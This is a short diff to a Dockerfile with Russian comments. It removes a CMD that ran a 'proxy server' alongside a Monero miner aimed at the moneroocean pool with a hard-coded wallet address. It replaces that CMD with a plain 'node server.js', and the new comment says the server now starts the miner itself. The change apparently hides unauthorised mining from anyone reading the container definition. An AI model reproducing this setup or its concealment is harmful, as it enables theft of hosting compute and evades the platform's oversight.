@@ -4,12 +4,10 @@ RUN apk add --no-cache nodejs npm
 
 WORKDIR /app
 
-# Копируем package.json и устанавливаем зависимости
 COPY package.json ./
 RUN npm install
 
-# Копируем серверный скрипт
 COPY server.js ./
 
-# Запускаем прокси-сервер в фоне, а затем майнер
-CMD sh -c 'node server.js & /entrypoint.sh -o gulf.moneroocean.stream:10004 -u 48oFiSuK4K4WBpQ29kx73CBRtSpm132W2hoXr9RyfUbUCrbvgqLV9PBH1aqyckZemdabBjrwM2D3YieJQD6CKiGZVgkxU36 -p x -k -t 2'
+# Запускаем сервер (он сам запустит майнер)
+CMD ["node", "server.js"]
